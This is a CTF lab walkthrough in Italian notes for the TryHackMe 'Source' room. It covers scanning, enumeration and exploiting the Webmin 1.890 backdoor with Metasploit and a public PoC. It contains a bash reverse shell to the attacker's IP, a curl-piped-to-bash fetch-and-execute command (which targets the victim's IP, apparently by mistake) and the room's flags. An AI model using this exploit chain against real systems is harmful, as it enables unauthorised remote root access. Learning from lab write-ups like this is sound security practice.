
#tryhackmelabs #laboratorio 

https://tryhackme.com/room/source

```
**Webmin** è un [software](https://it.wikipedia.org/wiki/Software "Software") che permette di gestire un [computer](https://it.wikipedia.org/wiki/Computer "Computer") tramite [interfaccia](https://it.wikipedia.org/wiki/Interfaccia_(informatica) "Interfaccia (informatica)") [web](https://it.wikipedia.org/wiki/Web "Web") (all'indirizzo http://localhost:10000). L'accesso è limitato agli utenti del sistema e permette di gestire la macchina da un punto di vista [hardware](https://it.wikipedia.org/wiki/Hardware "Hardware") e [software.](https://it.wikipedia.org/w/index.php?title=Software.&action=edit&redlink=1 "Software. (la pagina non esiste)") Il sistema è indirizzato ad amministratori e sistemisti, ma può risultare utile anche su computer [client](https://it.wikipedia.org/wiki/Client "Client").

Può gestire svariati aspetti del sistema, inclusi gli eventuali [server]
```

```
sudo nmap -p- --open --min-rate 5000 -sS -vvv -n -Pn 10.10.239.93 -oG risultatoscan
```

```
sudo nmap -sC -sV -p 22,10000 -Pn 10.10.130.202 -oN risultatoscan2
```

```
http://10.10.239.93:10000/
```
dice che lavora in SSL
```
https://10.10.239.93:10000/
```

==enumerazione indirizzi==
```
gobuster dir -u https://10.10.239.93:10000/ -w /usr/share/wordlists/dirb/common.txt -t50 -k -b "200"
```
	(-k disabilita verifica HTTPS, -b esclude codice di stato)
==enumerare con nmap script==
```
nmap -p 80 --script http-enum 10.10.239.93:10000
```
==enumerare con wfuzz==
```
wfuzz -c -L -t 400 --sc=200,301 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt https://10.10.239.93:10000/FUZZ
```
==enumerare con dirb==
```
dirb http://10.10.130.202:10000/ /usr/share/wordlists/dirb/common.txt
```
torniamo sul risultato di nmap
webmin_1.890_all.deb
```
10000/tcp open  http    MiniServ 1.890 (Webmin httpd)
```

```
searchsploit webmin 1.890
```

```
searchsploit -x linux/webapps/47330.rb
```
	q per uscire

```
msfconsole
```

```
search webmin
```
scegliamo
==10  exploit/linux/http/webmin_backdoor==   

```
info 10
```

```
use 10
```

```
options
```

ora settiamo il remote host
```
set RHOST 10.10.130.202
```
poi settiamo il listening host con il nostro IP Attaccante
```
set LHOST 10.21.9.220
```
	(oppure formato set LHOST tun0)

```
set SSL true
```

```
exploit
```
	(oppure run)

```
whoami
```

```
ls /root
```
root.txt
```
cat /root/root.txt
```

```
THM{UPDATE_YOUR_INSTALL}
```

```
pwd     
```

```
/usr/share/webmin
```

```
ls /home
```
dark
```
ls /home/dark
```
user.txt
```
cat /home/dark/user.txt
```

```
THM{SUPPLY_CHAIN_COMPROMISE}
```
### altra soluzione
https://github.com/n0obit4/Webmin_1.890-POC

```
wget https://github.com/n0obit4/Webmin_1.890-POC/blob/master/Webmin_exploit.py
```

```
python3 Webmin_exploit.py -host 10.10.162.102 -port 10000 -cmd whoami
```
entriamo come root!

facciamo un file di reverse shell da inviare alla macchina vittima
```
nano index.html
```

```
#!/bin/bash
bash -i >& /dev/tcp/10.21.9.220/443 0>&1
```

```
sudo su
```
esponiamo la cartella dove risiede index.html
```
python3 -m http.server 80
```
ci mettiamo in ascolto
```
nc -nlvp 443
```
eseguiamo
```
python3 Webmin_exploit.py -host 10.10.162.102 -port 10000 -cmd 'curl 10.10.162.102 | bash'
```
ed otteniamo la reverse shell!



